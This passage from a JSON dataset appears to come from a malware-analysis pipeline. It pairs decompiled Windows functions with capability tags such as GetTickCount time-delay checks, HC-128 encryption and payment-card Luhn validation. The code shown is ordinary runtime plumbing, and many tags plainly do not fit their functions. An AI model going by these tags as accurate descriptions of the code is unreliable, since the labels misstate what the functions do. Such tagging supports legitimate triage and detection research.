sub.msvcrt.dll_memset(pcVar8, 0x30, iVar2);\n                    *(arg4 + 0xc) = 0xffffffff;\n                }\n            }\n            else if (((uVar11 & 0x400) == 0) && (iVar10 = *(arg4 + 0xc),  *(arg4 + 0xc) = iVar10 + -1,  0 < iVar10)) {\n                do {\n                    *(&stack0xffffffffffffff90 + iVar5) = 0x140015a55;\n                    fcn.140014dc0(0x20, arg4);\n                    iVar10 = *(arg4 + 0xc);\n                    *(arg4 + 0xc) = iVar10 + -1;\n                } while (0 < iVar10);\n                uVar11 = *(arg4 + 1);\n            }\n        }\n    }\n    if ((uVar11 & 0x80) == 0) {\n        if ((uVar11 & 0x100) == 0) {\n            if ((uVar11 & 0x40) != 0) {\n                *pcVar7 = ' ';\n                pcVar7 = pcVar7 + 1;\n            }\n        }\n        else {\n            *pcVar7 = '+';\n            pcVar7 = pcVar7 + 1;\n        }\n    }\n    else {\n        *pcVar7 = '-';\n        pcVar7 = pcVar7 + 1;\n    }\n    if (pcVar3 < pcVar7) {\n        do {\n            pcVar7 = pcVar7 + -1;\n            if (((uVar11 & 0x4000) == 0) && (iVar10 = *(arg4 + 0x24),  *(arg4 + 5) == iVar10 || *(arg4 + 5) < iVar10)) {\ncode_r0x00014001589a:\n                *(arg4 + 0x24) = iVar10 + 1;\n            }\n            else {\n                if ((uVar11 & 0x2000) == 0) {\n                    *(*arg4 + *(arg4 + 0x24)) = *pcVar7;\n                    iVar10 = *(arg4 + 0x24);\n                    goto code_r0x00014001589a;\n                }\n                *(&stack0xffffffffffffff90 + iVar5) = 0x1400158d2;\n                sub.msvcrt.dll_fputc();\n                *(arg4 + 0x24) = *(arg4 + 0x24) + 1;\n            }\n            if (pcVar3 == pcVar7) break;\n            uVar11 = *(arg4 + 1);\n        } while( true );\n    }\n    iVar10 = *(arg4 + 0xc);\n    while( true ) {\n        *(arg4 + 0xc) = iVar10 + -1;\n        if (iVar10 < 1) break;\n        if (((*(arg4 + 1) & 0x4000) != 0) ||\n           (iVar4 = *(arg4 + 0x24),  iVar10 = iVar10 + -1,  *(arg4 + 5) != iVar4 && iVar4 <= *(arg4 + 5))) {\n            if ((*(arg4 + 1) & 0x2000) == 0) {\n                *(*arg4 + *(arg4 + 0x24)) = 0x20;\n                iVar4 = *(arg4 + 0x24);\n                iVar10 = *(arg4 + 0xc);\n            }\n            else {\n                *(&stack0xffffffffffffff90 + iVar5) = 0x14001592a;\n                sub.msvcrt.dll_fputc();\n                iVar4 = *(arg4 + 0x24);\n                iVar10 = *(arg4 + 0xc);\n            }\n        }\n        *(arg4 + 0x24) = iVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 2215
    },
    "14001179": {
        "rules": [
            "encrypt data using HC-128/96968cc2d377418d85ec89c0278a8523"
        ],
        "decompiled_code": "\nint64_t fcn.140011790(int64_t *arg1)\n\n{\n    return (*(arg1 + 1) + 999999) / 1000000 + *arg1 * 1000;\n}\n",
        "token_count": 47
    },
    "1400195c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.1400195c0(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    iVar1 = *(arg2 + 0x14);\n    uVar4 = *(arg1 + 0x14) - iVar1;\n    if (uVar4 == 0) {\n        puVar2 = arg1 + 0x18 + iVar1;\n        puVar3 = arg2 + 0x18 + iVar1 * 4;\n        do {\n            puVar2 = puVar2 + -1;\n            puVar3 = puVar3 + -1;\n            if (*puVar2 != *puVar3) {\n                return -(*puVar2 < *puVar3) | 1;\n            }\n        } while (arg1 + 0x18 < puVar2);\n    }\n    return uVar4;\n}\n",
        "token_count": 220
    },
    "1400197e": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint64_t fcn.1400197e0(int64_t arg1, int32_t *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    \n    uVar1 = arg1 + 0x18;\n    iVar2 = uVar1 + *(arg1 + 0x14) * 4;\n    uVar3 = *(iVar2 + -4);\n    uVar6 = 0x1f;\n    if (uVar3 != 0) {\n        for (; uVar3 >> uVar6 == 0; uVar6 = uVar6 - 1) {\n        }\n    }\n    uVar6 = uVar6 ^ 0x1f;\n    *arg2 = 0x20 - uVar6;\n    if (uVar6 < 0xb) {\n        uVar8 = 0;\n        uVar5 = 0xb - uVar6;\n        if (uVar1 < iVar2 - 4U) {\n            uVar8 = *(iVar2 + -8) >> (uVar5 & 0x1f);\n        }\n        return CONCAT44(uVar3 >> (uVar5 & 0x1f), uVar3 << (uVar6 + 0x15U & 0x1f) | uVar8) | 0x3ff0000000000000;\n    }\n    iVar7 = uVar6 - 0xb;\n    uVar5 = iVar7;\n    if (uVar1 < iVar2 - 4U) {\n        uVar6 = *(iVar2 + -8);\n        uVar4 = uVar6;\n        if (iVar7 == 0) {\ncode_r0x000140019887:\n            return (uVar3 | 0x3ff00000) << 0x20 | uVar4;\n        }\n        uVar8 = uVar6 << (uVar5 & 0x1f);\n        uVar9 = uVar8;\n        uVar4 = (uVar3 << (uVar5 & 0x1f) | uVar6 >> (-uVar5 & 0x1f) | 0x3ff00000) << 0x20;\n        if (uVar1 < iVar2 - 8U) {\n            uVar9 = uVar8 | *(iVar2 + -0xc) >> (-uVar5 & 0x1f);\n        }\n    }\n    else {\n        uVar4 = 0;\n        if (iVar7 == 0) goto code_r0x000140019887;\n        uVar9 = 0;\n        uVar4 = (uVar3 << (uVar5 & 0x1f) | 0x3ff00000) << 0x20;\n    }\n    return uVar4 | uVar9;\n}\n",
        "token_count": 675
    },
    "1400017c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.1400017cb(uchar *arg1)\n\n{\n    uchar auStack16 [16];\n    \n    return auStack16 <= arg1 && arg1 <= *0x1400eb2e0;\n}\n",
        "token_count": 48
    },
    "140001fa": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140001fac(ulong arg1)\n\n{\n    ulong arg1_00;\n    \n    if (0xdab < *0x1400eb240) {\n        arg1_00 = (**0x14001b130)(2);\n        fcn.140001f42(arg1_00, \"[GC] cannot register thread local variable; too many thread local variables\");\n        arg1 = 1;\n        *0x1400eb240 = sub.msvcrt.dll_exit();\n    }\n    *(*0x1400eb240 * 8 + 0x1400e44e0) = arg1;\n    *0x1400eb240 = *0x1400eb240 + 1;\n    return;\n}\n",
        "token_count": 157
    },
    "140001ff": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140001ffd(ulong arg1)\n\n{\n    ulong arg1_00;\n    \n    if (0xdab < *0x1400e4380) {\n        arg1_00 = (**0x14001b130)(2);\n        fcn.140001f42(arg1_00, \"[GC] cannot register global variable; too many global variables\");\n        arg1 = 1;\n        *0x1400e4380 = sub.msvcrt.dll_exit();\n    }\n    *(*0x1400e4380 * 8 + 0x1400dd620) = arg1;\n    *0x1400e4380 = *0x1400e4380 + 1;\n    return;\n}\n",
        "token_count": 158
    },
    "140002d8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140002d81(int64_t *arg1)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    ulong *arg1_00;\n    char acStack1402 [250];\n    code *pcStack1152;\n    uint *puStack1144;\n    uint *puStack1136;\n    uint64_t uStack1128;\n    int64_t *piStack1120;\n    ulong uStack1112;\n    ulong uStack1056;\n    ulong uStack1048;\n    uint auStack1040 [248];\n    \n    pcStack1152 = *0x14001b130;\n    uVar5 = (**0x14001b130)(2);\n    fcn.140001f42(uVar5, \"could not load: \");\n    uStack1112 = fcn.140001541(arg1);\n    uVar5 = (*pcStack1152)(2);\n    fcn.140001f42(uVar5, uStack1112);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    uStack1128 = uVar4;\n    if (uVar4 == 0xc1) {\n        uVar5 = (*pcStack1152)(2);\n        fcn.140001f42(uVar5, \"\\n(bad format; library may be wrong architecture)\");\n    }\n    arg1_00 = &uStack1056;\n    iVar10 = 0x3d7;\n    puStack1136 = auStack1040;\n    fcn.140002078(arg1_00, 1000);\n    uStack1048 = 0x203a64616f6c2074;\n    iVar6 = iVar10;\n    if (*arg1 < 0x3d8) {\n        iVar6 = *arg1;\n    }\n    uStack1056 = 0x6f6e20646c756f63;\n    puStack1144 = fcn.140001541(arg1);\n    for (iVar8 = iVar6; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puStack1136 = *puStack1144;\n        puStack1144 = puStack1144 + 1;\n        puStack1136 = puStack1136 + 1;\n    }\n    if ((uVar4 == 0xc1) && (0x2f < iVar10 - iVar6)) {\n        puStack1144 = \"\\n(bad format; library may be wrong architecture)\";\n        puStack1136 = arg1_00 + iVar6 + 0x10;\n        for (iVar10 = 0xc; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *puStack1136 = *puStack1144;\n            puStack1144 = puStack1144 + 1;\n            puStack1136 = puStack1136 + 1;\n        }\n    }\n    (*_sym.imp.USER32.dll_MessageBoxA)(0, arg1_00, 0, 0);\n    uVar5 = (*pcStack1152)(2);\n    iVar10 = 0x14001c0de;\n    fcn.140001f42(uVar5, 0x14001c0de);\n    uVar5 = 1;\n    sub.msvcrt.dll_exit(1);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    piStack1120 = arg1;\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (iVar6 == 0) {\n        iVar6 = 1;\n        fcn.140002078(acStack1402, 0xfa);\n        acStack1402[0] = '_';\n        do {\n            cVar1 = *(iVar10 + -1 + iVar6);\n            if (cVar1 == '\\0') break;\n            acStack1402[iVar6] = cVar1;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 != 0xf5);\n        acStack1402[iVar6] = '@';\n        uVar9 = 99;\n        do {\n            uVar7 = uVar9 - 99;\n            if (uVar9 < 199) {\n                if (uVar9 - 0x5a < 0x13) {\n                    iVar6 = iVar6 + 1;\n                }\n                else {\n                    iVar6 = iVar6 + 2;\n                }\n            }\n            else {\n                iVar6 = iVar6 + 3;\n            }\n            acStack1402[iVar6 + 1] = '\\0';\n            do {\n                acStack1402[iVar6] = SUB161(ZEXT816(uVar7) % ZEXT816(10), 0) + '0';\n                iVar6 = iVar6 + -1;\n                uVar7 = uVar7 / 10;\n            } while (uVar7 != 0);\n            iVar8 = (*pcVar3)(uVar5);\n            pcVar2 = *0x14001b130;\n            if (iVar8 != 0) {\n                return;\n            }\n            uVar9 = uVar9 + 4;\n        } while (uVar9 != 0x12f);\n        uVar5 = (**0x14001b130)(2);\n        fcn.140001f42(uVar5, \"could not import: \");\n        uVar5 = (*pcVar2)(2);\n        fcn.140001f42(uVar5, iVar10);\n        uVar5 = (*pcVar2)(2);\n        fcn.140001f42(uVar5, 0x14001c0de);\n        sub.msvcrt.dll_exit(1);\n    }\n    return;\n}\n",
        "token_count": 1291
    },
    "140004d9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140004d99(int64_t *arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    if (arg1[1] <= *arg1) {\n        iVar1 = (arg1[1] * 3) / 2;\n        arg1[1] = iVar1;\n        iVar2 = fcn.1400029cb(0x1400eb348, iVar1 * 8 + 0x10);\n        puVar3 = arg1[2];\n        *(iVar2 + 8) = 1;\n        puVar4 = iVar2 + 0x10;\n        for (iVar1 = *arg1 * 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        fcn.140004d89(arg1[2]);\n        arg1[2] = iVar2 + 0x10;\n    }\n    iVar1 = *arg1;\n    *(arg1[2] + iVar1 * 8) = arg2;\n    *arg1 = iVar1 + 1;\n    return;\n}\n",
        "token_count": 294
    },
    "1400063a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400063ae(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t arg1_00;\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    \n    iVar5 = 0;\n    if (-1 < arg2) {\n        iVar5 = arg2;\n    }\n    if (arg1 == NULL) {\n        piVar1 = fcn.14000637b(arg2);\n        *piVar1 = arg2;\n    }\n    else {\n        piVar1 = arg1;\n        if ((arg1[1] & 0x3fffffffffffffffU) < iVar5) {\n            arg1_00 = fcn.1400017aa(arg1[1] & 0x3fffffffffffffffU);\n            if (arg1_00 <= arg2) {\n                arg1_00 = arg2;\n            }\n            piVar1 = fcn.140005f46(arg1_00);\n            iVar2 = *arg1;\n            *piVar1 = iVar2;\n            piVar3 = arg1 + 2;\n            piVar4 = piVar1 + 2;\n            for (iVar2 = iVar2 + 1; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *piVar4 = *piVar3;\n                piVar3 = piVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            piVar3 = piVar1;\n            fcn.140002078(piVar1 + *arg1 + 0x10, arg2 - *arg1);\n            piVar3[1] = arg1_00;\n        }\n    }\n    *piVar1 = iVar5;\n    *(piVar1 + iVar5 + 0x10) = 0;\n    return piVar1;\n}\n",
        "token_count": 429
    },
    "14000ae9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.14000ae90(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 182
    },
    "1400132f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400132f0(ulong arg1, ulong arg2, ulong arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg3);\n    iVar1 = *arg4;\n    if (0x7fffffff < iVar1 + arg2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n        return 0x22;\n    }\n    LOCK();\n    *arg4 = *arg4 + arg2;\n    if (iVar1 < 0) {\n        iVar2 = -iVar1;\n        if (arg2 < -iVar1) {\n            iVar2 = arg2;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(arg1, iVar2, 0);\n        if (iVar1 == 0) {\n            LOCK();\n            *arg4 = *arg4 - arg2;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n            return 0x16;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n    return 0;\n}\n",
        "token_count": 260
    },
    "14001728": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.140017280(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (0x1b < arg1) {\n        iVar1 = 4;\n        do {\n            iVar1 = iVar1 * 2;\n            uVar3 = uVar3 + 1;\n        } while (iVar1 + 0x17 < arg1);\n    }\n    puVar2 = fcn.140018e70(uVar3);\n    *puVar2 = uVar3;\n    return puVar2 + 1;\n}\n",
        "token_count": 147
    },
    "14001a18": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14001a180(uint64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    \n    uVar1 = fcn.14001a140(0);\n    if (uVar1 <= arg1) {\n        uVar1 = fcn.14001a140(0x13);\n        if (arg1 <= uVar1) {\n            iVar2 = fcn.14001a140(0);\n            sub.msvcrt.dll__lock((arg1 - iVar2 >> 4) * -0x55555555 + 0x10);\n            *(arg1 + 0x18) = *(arg1 + 0x18) | 0x8000;\n            return;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00014001a1ac. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 225
    },
    "14001a1f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14001a1f0(uint64_t arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    \n    uVar1 = fcn.14001a140(0);\n    if (uVar1 <= arg1) {\n        uVar1 = fcn.14001a140(0x13);\n        if (arg1 <= uVar1) {\n            *(arg1 + 0x18) = *(arg1 + 0x18) & 0xffff7fff;\n            iVar2 = fcn.14001a140(0);\n    // WARNING: Could not recover jumptable at 0x00014001a280. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll__unlock)((arg1 - iVar2 >> 4) * -0x55555555 + 0x10);\n            return;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x00014001a21c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg1 + 0x30);\n    return;\n}\n",
        "token_count": 266
    },
    "14000150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140001500(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll__onexit();\n    return -(iVar1 == 0);\n}\n",
        "token_count": 44
    },
    "14000158": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000158a(ulong arg1)\n\n{\n    uint64_t uVar1;\n    \n    if (arg1 < 0x10000) {\n        uVar1 = ~-(arg1 < 0x100) & 8;\n    }\n    else {\n        uVar1 = (-(arg1 < 0x1000000) & 0xfffffffffffffff8) + 0x18;\n    }\n    return *((arg1 >> (uVar1 & 0x1f)) + 0x1400d64c0) + uVar1;\n}\n",
        "token_count": 129
    },
    "14000178": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001780(int64_t arg1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = *(*(arg1 + 8) + 0x28);\n    if (pcVar1 != NULL) {\n        *0x1400eb340 = *0x1400eb340 + 1;\n        (*pcVar1)(arg1 + 0x10);\n        *0x1400eb340 = *0x1400eb340 + -1;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "140001a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001a2e(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint64_t uVar17;\n    uint64_t uVar18;\n    uint64_t uVar19;\n    uint64_t uVar20;\n    uint64_t uVar21;\n    uint64_t uVar22;\n    uint64_t uVar23;\n    uint64_t uVar24;\n    \n    uVar1 = arg1[4];\n    uVar5 = arg1[2];\n    uVar21 = arg1[7];\n    uVar24 = arg1[5] ^ arg1[6];\n    uVar13 = uVar1 ^ uVar5;\n    uVar17 = *arg1 ^ uVar24;\n    uVar14 = uVar21 ^ arg1[1];\n    uVar6 = uVar21 ^ uVar1;\n    uVar2 = arg1[1] ^ uVar17;\n    uVar10 = uVar21 ^ uVar5;\n    uVar7 = uVar13 ^ uVar14;\n    uVar5 = uVar5 ^ arg1[3] ^ uVar7;\n    uVar18 = arg1[6] ^ arg1[3] ^ uVar7;\n    uVar3 = uVar24 ^ uVar5;\n    uVar4 = uVar6 ^ uVar18;\n    uVar24 = uVar24 ^ uVar4;\n    uVar15 = uVar13 & (uVar3 ^ uVar4) ^ uVar6 & uVar4;\n    uVar8 = uVar10 & uVar3 ^ uVar6 & uVar4;\n    uVar11 = (uVar10 ^ uVar2) & (*arg1 ^ uVar5) ^ uVar18 ^ uVar7 & uVar5 ^ uVar15;\n    uVar18 = (uVar1 ^ uVar17) & *arg1 ^ uVar10 ^ uVar3 ^ uVar7 & uVar5 ^ uVar8;\n    uVar15 = uVar2 & uVar17 ^ uVar14 ^ uVar24 ^ uVar14 & uVar24 ^ uVar15;\n    uVar8 = (uVar21 ^ uVar17) & (uVar4 ^ *arg1) ^ uVar14 & uVar24 ^ uVar21 ^ uVar24 ^ uVar8;\n    uVar12 = uVar11 & uVar15;\n    uVar11 = uVar11 ^ uVar18;\n    uVar20 = uVar11 & (uVar8 ^ uVar12) ^ uVar18;\n    uVar18 = (uVar18 ^ uVar12) & (uVar15 ^ uVar8);\n    uVar9 = uVar8 ^ uVar18;\n    uVar18 = uVar8 & (uVar18 ^ uVar12);\n    uVar15 = uVar15 ^ uVar9 ^ uVar18;\n    uVar16 = uVar20 ^ uVar9;\n    uVar11 = (uVar18 ^ uVar8 ^ uVar12) & uVar20 ^ uVar11;\n    uVar12 = uVar15 ^ uVar11;\n    uVar24 = uVar24 & (uVar20 ^ uVar11);\n    uVar14 = uVar14 & (uVar20 ^ uVar11);\n    uVar23 = (uVar3 ^ uVar4) & (uVar12 ^ uVar16);\n    uVar13 = (uVar12 ^ uVar16) & uVar13;\n    uVar8 = (uVar4 ^ *arg1) & uVar20;\n    uVar19 = uVar11 & uVar2 ^ uVar8;\n    uVar2 = (uVar10 ^ uVar2) & uVar15;\n    uVar18 = uVar6 & uVar16 ^ uVar13;\n    uVar6 = uVar16 & uVar4 ^ uVar24 ^ uVar23;\n    uVar24 = uVar5 & (uVar9 ^ uVar15) ^ uVar24;\n    uVar16 = uVar18 ^ uVar17 & uVar11;\n    uVar4 = *arg1 & uVar9 ^ uVar14 ^ uVar24;\n    uVar22 = (uVar9 ^ uVar15) & uVar7 ^ uVar2 ^ uVar16;\n    uVar7 = uVar17 & uVar11 ^ uVar6;\n    uVar16 = uVar3 & uVar12 ^ uVar23 ^ uVar16;\n    uVar21 = uVar20 & (uVar21 ^ uVar17) ^ uVar4 ^ uVar16;\n    uVar5 = uVar15 & (*arg1 ^ uVar5) ^ uVar22;\n    uVar24 = uVar24 ^ uVar5;\n    arg1[4] = uVar24;\n    arg1[7] = uVar22 ^ uVar6;\n    arg1[6] = ~(uVar7 ^ uVar24);\n    arg1[5] = ~(uVar12 & uVar10 ^ uVar13 ^ uVar7 ^ uVar21);\n    arg1[3] = uVar5 ^ *arg1 & uVar9 ^ uVar8;\n    arg1[2] = uVar21 ^ uVar9 & (uVar1 ^ uVar17) ^ uVar2;\n    arg1[1] = ~(uVar16 ^ uVar14 ^ uVar19);\n    *arg1 = ~(uVar19 ^ uVar18 ^ uVar4);\n    return;\n}\n",
        "token_count": 1333
    },
    "140001e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140001e0a(void)\n\n{\n    int64_t iVar1;\n    uchar auStack16 [16];\n    \n    iVar1 = 0;\n    if (auStack16 != NULL) {\n        iVar1 = *0x1400eb2e0 - auStack16;\n    }\n    return iVar1;\n}\n",
        "token_count": 74
    },
    "140001e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140001e3f(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    \n    iVar1 = fcn.140001e0c(arg1 >> 0xc);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = arg1 >> 4 & 0xff;\n        uVar2 = 1 << (uVar2 & 0x3f) & *(iVar1 + 0x10 + (uVar2 >> 6) * 8);\n        uVar2 = uVar2 & 0xffffffffffffff00 | uVar2 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 159
    },
    "140001ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001eda(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = fcn.140001e7d(arg1 >> 9);\n    if (iVar2 != 0) {\n        uVar3 = arg1 & 0x1ff;\n        puVar1 = iVar2 + 0x10 + (uVar3 >> 6) * 8;\n        *puVar1 = *puVar1 & ~(1 << (uVar3 & 0x3f));\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "140001f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
